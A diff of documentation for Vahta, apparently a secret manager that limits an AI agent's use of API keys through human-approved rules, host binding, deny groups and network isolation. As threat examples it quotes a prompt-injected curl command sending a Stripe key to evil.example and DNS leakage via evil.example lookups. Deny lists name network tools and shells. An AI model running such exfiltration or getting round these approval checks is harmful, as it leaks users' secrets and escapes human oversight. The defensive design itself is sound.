@@ -36,6 +36,7 @@ nothing was done.
 | `vahta lock [--all]` | End this project's sessions, or all of them. | no |
 | `vahta sessions [--json]` / `vahta sessions kill ID` | List sessions, or end one and everything below it. | no |
 | `vahta run [--secret NAME]... [--as NAME=VAR]... [--ask [--reason TEXT]] -- COMMAND` | Run a command with secrets in its environment. A secret with command rules only goes to commands they allow; `--ask` asks the person about one they do not. | only without a session |
+| `vahta http --secret NAME [-H 'Name: {NAME}']... [--query K={NAME}]... [-X METHOD] [-d TEXT\|@FILE] [--json] URL` | One HTTPS request made by the daemon, with the secret put in a header or query value; only to hosts the secret is bound to (below). | only without a session |
 | `vahta bind [NAME] [--allow RULE]... [--deny RULE]... [--clear] [--reason TEXT]` | Propose which commands may use a secret, or approve the rules in `vahta.toml`. The person approves in the window. | yes |
 | `vahta delegate --secret NAME... [--for DURATION] -- COMMAND` | Give a sub-agent a narrower session. | no |
 | `vahta output allow REF [--reason TEXT]` | Ask the person to show the agent what the hook cut out of a tool's output (see [hooks.md](hooks.md)). | only without a session |
@@ -177,55 +178,191 @@ vahta run --secret API_KEY --as API_KEY=SERVICE_TOKEN -- ./deploy.sh
 - **Children inherit the session.** A `vahta run` from inside a command the daemon
   started uses the same session.
 
+## Rule sets and categories
+## `vahta http`
+
+```
+vahta http --secret STRIPE_KEY -H 'Authorization: Bearer {STRIPE_KEY}' https://api.stripe.com/v1/balance
+vahta http --secret MAPS_KEY --query key={MAPS_KEY} --json https://maps.example.com/geocode?q=Oslo
+```
+
+The daemon makes the request, so the command and the agent never hold the value,
+and the response comes back with every value taken out. It is the one operation
+in Vahta that opens a network connection.
+
+- **Where a value goes.** Only where `{NAME}` stands in a header value or a
+  `--query` value. Never in the URL path (paths end up in every server, proxy
+  and CDN log), never in a header or query *name*, and never in the body: servers
+  echo bodies back (validation errors, debug pages), and the scrubber should not
+  be the first line of defence. A `{NAME}` in the URL, a name or the body is
+  refused, not sent, and so is a `--secret` that no header or query value uses.
+  A provider that needs its key in a JSON body is a later decision.
+  A `{...}` that is not a declared name is sent as written. Query values are
+  percent-encoded by Vahta; pass them raw.
+- **Host binding.** A secret may only be sent to hosts its approved rule set
+  lists (`Network::Hosts`): the URL's host equals a rule's host, or lies beneath
+  it when the rule has `subdomains`; the port equals the rule's, or any port when
+  the rule has none (the URL's port is 443 unless it says otherwise). Everything
+  else is refused (exit 3) before any window or connection, naming the secret and
+  the fix: no rule set, `Network::None`, and `Network::App` (the application's own
+  network use, which is what a command-only binding approves) are refused with
+  `vahta bind NAME --net hosts:HOST` as the proposal. All secrets of a request
+  must pass. The person's approval is the check; the agent can only propose.
+- **Values.** The same as `vahta run`: a session that covers the names, else a
+  window asks for the password for this one request (it shows the secrets and
+  `METHOD host`); each-use secrets always ask; a delegated session cannot ask for
+  more.
+- **The client.** https only (`http://` is refused), certificates checked
+  against the Mozilla roots with rustls (ring), no cookies, no proxy (the
+  `HTTPS_PROXY` family is not read), connect timeout 10 s and 30 s in all
+  (`--timeout`, at most 120), response kept up to 4 MiB (`--max-bytes`, at most
+  8 MiB; the cut is reported). Redirects are never followed by the library; at
+  most 3 are followed by Vahta, **only on the same host and port**, with the
+  same headers. A redirect elsewhere is not followed: the redirect itself is
+  returned, `vahta http` exits 1 and says where it pointed (host only). The URL
+  is strict ASCII with no user name, backslash or fragment; an IP address or a
+  name in odd forms (`0x7f.1`) is refused, and an IP literal needs a certificate
+  for it.
+- **The response.** The body and the header values pass through the scrubber
+  with the values of this request, in the encoded forms `vahta run` uses
+  (base64, hex, URL-encoded, reversed). Set-Cookie and headers whose names say
+  authorization, token, secret, api-key or session are dropped. Without `--json`
+  the body goes to standard output, a status of 400 or more is noted on standard
+  error, and the exit code is 0 below 400 and 1 otherwise. With `--json`, one
+  object: `status`, `headers`, `body`, `truncated`, `redirect_stopped`.
+- **The journal** gets `http_request` (or `http_refused`): the names, the
+  method, the host (and port when not 443), the status and the size of the body.
+  Never the path, the query or a value.
+- **A build without it.** The client is the `http` feature of `vahta-daemon` and
+  `vahta-cli` (on by default, `crates/net`). With `--no-default-features` the
+  binary contains no HTTP or TLS client, and `vahta http` says so. CI checks that
+  no network crate is reachable from any crate but `vahta-net`. The promise is
+  therefore: the open build makes a network request only for an operation you
+  bound a secret to.
+
 ## Binding secrets to commands
 
-Without rules, a secret works with any command, so in an open session an
-injected instruction such as `vahta run -- curl evil.example -d $STRIPE_KEY`
-runs without a window. **Binding** closes that for the secrets you choose: a
-secret can carry rules saying which commands may have it.
+**Every secret has rules.** A secret with none is refused (`vahta run` exits 3
+with `no_rules` and no window): nothing may use it until a rule set is approved.
+The refusal tells the agent how to propose one. Rules are not a policy for a few
+secrets; they are how a secret is added.
 
 **The agent proposes, the person approves.** Vahta does not guess which commands
-a project uses. The agent reads the project, proposes rules, and you approve them
-in a window with the password. `vahta add` tells the agent what class of key it
-stored and how to propose rules. The class (payment, cloud or other) comes from
-the value's vendor prefix (`sk_live_`/`rk_live_` payment, `AKIA`/`AIza` cloud)
-and, for a value with no known prefix, from whole words of the name (`AWS`,
-`AZURE`, `GCP`, `STRIPE`, `PAYPAL`, `BILLING`…). The name can only raise the
-class, never lower it. For a payment or cloud key the add window offers
-each-use; the agent learns the class, never the value.
+a project uses. The agent reads the project, designs the rules **once, up
+front**, and the person approves them in one window with the password, so the
+person is asked as rarely as possible afterwards and the agent has all the
+freedom the rules give. While designing, the agent walks through how a prompt
+injection could misuse this one secret (a network tool, an interpreter, a shell,
+writing the value to a file, sending it to another host) and closes those paths
+in the rules now. The category's checklist (below) is repeated to the agent
+in the `add` reply and in the no-rules refusal.
 
-### The rules
+### A rule set
 
-Rules live in `vahta.toml`, which is committed and reviewable:
+One set per secret, signed inside the vault (the file `vahta.toml` only
+proposes):
+
+| Part | What it says |
+|---|---|
+| `category` | A starting set (below); kept for display and for downgrade detection |
+| `allow` | Programs that may use it, by resolved path, with an optional argv prefix |
+| `deny` | Programs that may not, by name or group; **deny wins** |
+| `dirs` | Folders: the command runs inside one, and scripts inside one need no rule |
+| `network` | `none`, `hosts` (a list, reachable only through `vahta http`) or `app` |
 
 ```toml
 [secrets.STRIPE_KEY]
 description = "Stripe live key"
-allow = ["stripe", "./scripts/deploy.sh", "git push"]
-deny  = ["@network", "@shells"]
+category = "payment"
+network = "hosts"
+hosts = ["api.stripe.com"]
+allow = ["printenv"]
+deny = ["@shells", "@interpreters", "@network"]
+
+[secrets.DEPLOY_TOKEN]
+category = "ordinary"
+allow = ["./scripts/deploy.sh", "git push"]
+dirs = ["./scripts"]
 ```
 
-- A rule is **one string**: the first word is the program, any further words are
-  the argv prefix the command must start with (`git push` matches `git push
-  origin` and not `git pull`). Words are split on whitespace. There is no
-  quoting (a rule with a quote is refused) and there are no patterns.
-- **Program forms.** A bare name (`stripe`) is looked up in the caller's `PATH`.
-  A name with a slash (`./scripts/deploy.sh`) is relative to the **project
-  root**, not the current directory. `@group` is for `deny` only; a group in
-  `allow` is refused.
-- **Semantics.** If `allow` is not empty, the command's program must match an
-  allow rule. Any `deny` match refuses, and **deny wins**. No rules at all means
-  any command is allowed; there is no strict mode.
-- **Allow matches the file, not the name.** The program is resolved to a
-  canonical path when you approve the rule, and the command's program is
-  resolved the same way at run time (through the caller's `PATH`, following
-  symlinks). A `stripe` earlier on the `PATH` that is a different file is
-  refused. What is checked is what runs: the daemon starts the resolved path,
-  for every run, bound or not.
-- **Deny matches the name.** The file name of the program, lower-cased, without
-  `.exe`/`.cmd`/`.bat` and a trailing version (`python3.12` is `python`), and
-  also the name the caller typed. A copy of `curl` in another directory is still
-  caught. The groups are:
+`category`, `dirs`, `network` and `hosts` are optional. A file that says nothing
+about network proposes `app`. A secret the file lists with none of the rule keys
+proposes nothing, so the approved rules stand (`vahta bind NAME --clear` removes
+rules).
+
+### Categories
+
+The categories are TOML files in the repository (`crates/policy/categories/`),
+reviewed like code and **compiled into the binary**. No file, setting or command
+on a machine changes them, so an agent cannot rewrite one to suit itself.
+
+| Category | Rank | Tier | Network | Always denies | Folders | Programs |
+|---|---|---|---|---|---|---|
+| `payment` | 6 | each-use | `hosts` (named) | shells, interpreters, network programs | no | optional |
+| `publish` | 5 | each-use | `app` | shells, interpreters, network programs | no | required |
+| `server` | 4 | session | `app` | shells, interpreters | yes | required |
+| `database` | 3 | session | `app` | shells, interpreters, network programs | yes | required |
+| `local-only` | 2 | session | `none` | shells, interpreters, network programs | yes | required |
+| `ordinary` | 1 | session | `hosts`, `app` or `none` (default `app`) | shells, network programs | yes | optional |
+
+- **Why these networks.** `payment` and `ordinary`-with-`hosts` have a fixed
+  list of hosts, reached only through `vahta http`, so the command itself runs
+  with no network (Linux). Database clients are not HTTP: `vahta http` cannot
+  carry them and cutting the network would stop them, so `database` (like
+  `server` and `publish`, whose tools speak their own protocols) uses `app` and
+  relies on naming the client, denying shells, interpreters and network programs,
+  and a narrow database role. `local-only` has no network at all.
+- **Rank** orders how much a leak or misuse costs and how much oversight the
+  defaults ask for. They are distinct on purpose. `local-only` ranks low although
+  it is strict, since its tier is a session.
+- **The category adds its denies** to what the agent proposes and refuses a
+  proposal it cannot take (a payment key with `app` network, folders for a
+  payment key, no program for a `server` key, an allowed `python` for a key whose
+  category denies interpreters).
+- **Which category.** `--category` names one. Left out, Vahta suggests the
+  highest-ranked one that fits: the **class** of the value (vendor prefix:
+  `sk_live_` payment, `AKIA`/`AIza` cloud, which points at `server`) and whole
+  words of the name (`DATABASE`, `DB`, `POSTGRES`: database; `NPM`, `PYPI`,
+  `GITHUB`: publish; `SIGNING`, `GPG`, `PASSPHRASE`: local-only; the cloud and
+  payment words as before).
+
+### Adding a secret: one window
+
+`vahta add NAME [--category C] [--allow R]... [--deny R]... [--dir PATH]...
+[--net none|app|hosts:H[,H...]] [--reason TEXT] [--tier session|each-use]`.
+The agent's proposal is checked and its programs and folders resolved **before**
+any window opens (a proposal that cannot be right is refused with no window). Then
+one window: the password, the value (with the usual whitespace check), and the
+rules in plain words:
+
+> Payment key. Works only through Vahta with api.stripe.com. Only these may
+> run: printenv. Never: @shells, @interpreters, @network. Asks you every time.
+
+with the resolved program of every allow rule, the agent's reason (marked
+unverified) and warnings (a program or folder the agent can write to, a launcher
+or shell). The choices are **Accept**, **Use the default set for CATEGORY**
+(the category's own deny groups and network, keeping the agent's programs; for a
+category that needs hosts and has none, the window asks for them) and **Cancel**.
+With no rule flags the proposal is the suggested category's default set. The
+rules are stored in the same save as the secret and written to `vahta.toml`. The
+tier is the category's unless `--tier` says otherwise (a session tier for a
+category that asks every time is called out in the window). `reset` keeps the
+rules and still offers each-use for a payment or cloud value.
+
+**A downgrade is allowed, loudly.** If the agent's category ranks below the one
+the value and name point at, the window's first warning reads: *This asks to
+downgrade: the value looks like a payment key, whose default category is payment;
+the agent proposes ordinary.* "Use the default set for payment" then overrules it
+in one click. Accepting a downgrade stores `downgraded_from` with the rules and
+writes `category_downgraded` to the journal.
+
+### Evaluating a command (`vahta_policy::evaluate`)
+
+In this order, for each secret in the run; the first that does not pass refuses:
+
+1. **Deny.** By the program's file name, normalised (no `.exe`, no trailing
+   version; `python3.12` is `python`), and by the name the caller typed; a launcher
+   (`env curl ...`, `timeout 5 nc ...`) is looked through. Groups:
 
 | Group | Programs |
 |---|---|
@@ -233,28 +370,50 @@ deny  = ["@network", "@shells"]
 | `@shells` | sh, bash, zsh, fish, dash, ksh, csh, tcsh, pwsh, powershell, cmd, nu |
 | `@interpreters` | python, node, deno, bun, ruby, perl, php, lua, osascript |
 
+2. **Network cannot be cut** (see below): for `none` or `hosts`, a program in
+   `@network`, `@shells` or `@interpreters` is refused.
+3. **Folders**, when the set has any: the working directory must be inside one.
+   Otherwise refused (adding a program cannot fix that).
+4. **Programs.**
+   - no `allow` and no folders: any program;
+   - `allow` set: the resolved program matches an allow rule (canonical path and
+     argv prefix) **or**, when there are folders, is a file inside one;
+   - no `allow` but folders: the program must be inside a folder.
+5. **Network.** `none` and `hosts` ask for a run with no network; `app` does not.
+   Several secrets in one run: if any asks for no network, the whole run has none.
+
+`write` on a folder (`PATH:ro`) is recorded and shown but not enforced yet.
+Rules for programs: a rule is **one string**, the program then any leading
+arguments (`git push` matches `git push origin`, not `git pull`); no quoting and
+no patterns; a bare name is looked up in the caller's `PATH`; a name with a slash
+is relative to the **project root**; `@group` is for `deny` only. **Allow matches
+the file, not the name**: the program is resolved when you approve and again at
+run time, following symlinks, and the daemon starts the resolved path.
+
 ### The vault's copy is what counts
 
-`vahta.toml` is a **proposal**: anyone who can push can edit it. The rules the
-daemon enforces are the **approved copy inside the signed vault**. A change to
-the file takes effect only after you approve it in a window with the password
-(`vahta bind`). Until then `vahta list` shows `bound (toml differs)`,
-`vahta check` fails with the names, and a refused run says the file's rules are
-not approved.
+`vahta.toml` is a **proposal**: anyone who can push can edit it. The daemon
+enforces the **approved copy inside the signed vault**; a change to the file takes
+effect only after you approve it (`vahta bind`). Until then `vahta list` shows
+`(toml differs)`, `vahta check` fails with the names, and a refused run says the
+file's rules are not approved. `vahta list` shows each secret's category and
+network (or `NO RULES`); `vahta check` lists them for the names in the file.
 
 ### `vahta bind`
 
-- `vahta bind NAME --allow stripe --deny @shells --reason "deploys use it"`
-  opens one window: the secret's current rules and the proposed ones (the
-  proposal **replaces** the current rules), where each allowed program resolves
-  to, a warning for a file inside the project or a temp directory (the agent can
-  change it) and for a shell or interpreter, and the agent's reason, shown
-  marked as unverified. On **Approve** and the password it writes `vahta.toml`
-  first, then the vault. `--clear` removes the rules.
-- `vahta bind` with no name approves `vahta.toml` as written: the window shows
-  what differs for each name, and one approval writes the vault.
+- `vahta bind NAME --category C --allow stripe --deny @shells --dir ./scripts
+  --net hosts:api.stripe.com --reason "..."` opens one window: the current rules
+  and the proposed ones (the proposal **replaces** them), where each allowed
+  program resolves, warnings (a file or folder in the project or a temp directory,
+  a shell or interpreter, a downgrade) and the agent's reason, marked unverified.
+  On **Approve** and the password it writes `vahta.toml` first, then the vault.
+  With only `--allow`/`--deny` and rules already approved, the category, folders and
+  network stay as they are. `--clear` removes the rules (nothing may use the
+  secret until new ones are approved).
+- `vahta bind` with no name approves `vahta.toml` as written for every name whose
+  entry proposes rules and differs from the vault.
 - Nothing changes without the window and the password. An agent may call it; it
-  only asks. It is refused (exit 3) for an unknown name or no vault.
+  only asks.
 
 ### A command that is not on the list
 
@@ -269,34 +428,69 @@ vahta run --ask --reason "deploy needs the key" --secret STRIPE_KEY -- ./scripts
 The window shows the secrets, the command, the resolved program, the rules and
 the reason. The choices:
 
-- **Allow once**: the run goes on and nothing is stored. (In a session there is
-  no second window; otherwise the run's own password window follows.)
+- **Allow once**: the run goes on and nothing is stored.
 - **No**, or closing the window: nothing runs, exit 4.
 - **Add to the list**: asks for the password again, then adds the program (as
   typed, no arguments) to the secret's `allow`, in `vahta.toml` first and then the
-  vault, and runs. **Not offered** for a command a `deny` rule matches (that can
-  only be allowed once), or when the ask comes from a delegated session.
+  vault, and runs. **Not offered** for a command a `deny` rule matches, a working
+  directory outside the folders or a network that cannot be cut (these can only
+  be allowed once), or when the ask comes from a delegated session.
 
 The journal records `run_refused` (with the resolved program, never the
-arguments), `run_allowed_once` and `binding_added`.
+arguments; `no_rules` for a secret without rules), `run_allowed_once`,
+`binding_added` and `category_downgraded`.
 
-### What binding does not do
+### What rules do not do
 
 - **`allow` is the guard; `deny` is a speed bump.** A program in no group, or a
   renamed copy of one under a name the caller does not type, gets past a deny
   list. Prefer allowing exactly what is needed.
 - **Allowing a program that runs other programs allows everything.** Shells,
-  interpreters and launchers (`env`, `sudo`, `xargs`, `timeout`, `nohup`, `npx`…)
-  start whatever their arguments name, and both windows warn about them. A deny
-  rule looks past a launcher (`env curl …` is denied by `@network`), but not into
-  a shell string or a script.
-- **An allowed script inside the project can be edited by the agent.** The rule
-  names the file, not its contents. The window warns when the program is in the
-  project or a temp directory.
+  interpreters and launchers (`env`, `sudo`, `xargs`, `timeout`, `nohup`, `npx`...)
+  start whatever their arguments name, and the windows warn about them. A deny
+  rule looks past a launcher, but not into a shell string or a script.
+- **A script or folder inside the project can be edited by the agent.** A rule
+  names the file, not its contents; a folder lets any file put in it use the
+  secret. The window warns; payment keys cannot be given folders.
 - **An allowed program can itself pass the secret on.** `git push` with the key
-  can send it anywhere that `git` is told to.
+  can send it anywhere that `git` is told to; a program that writes a file can
+  leave the value where the agent reads it.
 - The check and the start are two steps: a file replaced between them is not
   caught.
+- **Deny groups do not cut the network; only "no network" does.** See below.
+
+### Running with no network
+
+A command can be started with no network at all, as opposed to a deny list of
+program names.
+
+- **Linux: real isolation.** The command starts in its own user and network
+  namespace. It has no interface but a loopback that is down: it cannot connect
+  to the internet, to services on `127.0.0.1` or the local network, whatever it is
+  called, whether it is a renamed copy, an interpreter running a script, or
+  something it starts itself. Its user and group id are mapped to your own, so it
+  reads and writes the project exactly as before. This needs unprivileged user
+  namespaces; some systems (Ubuntu 24.04 restricts them with AppArmor) turn them
+  off. Then see the fallback below.
+- **Unix sockets are closed off too.** The command also gets its own mount
+  namespace in which `/run` (and `/var/run` where it is a real directory) and
+  `/tmp/.X11-unix` are empty. The system and session buses, systemd-resolved (so a
+  lookup of `<data>.evil.example` has nowhere to go), `docker.sock`, the XDG
+  runtime directory and X11 are not there for it. Abstract Unix sockets belong to
+  the network namespace, so they are gone as well. `/tmp` itself is untouched,
+  since the project or temp files may live there.
+- **What it does not cut.** A pathname Unix socket anywhere else is still
+  reachable: in the project, in `/tmp`, in the home directory (some tools keep an
+  agent or control socket there). It is not a file-system sandbox. If the mount
+  setup fails, the run is refused.
+- **macOS and Windows, or Linux with user namespaces off: no isolation.** There
+  is no unprivileged way to do it. For a secret whose rules ask for `none` or
+  `hosts`, Vahta then **refuses programs in `@network`, `@shells` and
+  `@interpreters`** for that run, and says so in the refusal ("this system cannot
+  cut the network"); any other program runs with the network on, and the journal
+  says the network was not cut. That is a speed bump, not a wall: a program in no
+  group, or a renamed copy, gets past it. A run that was asked to be isolated and
+  whose isolation then fails at start is refused, never run open.
 
 ## The daemon
 
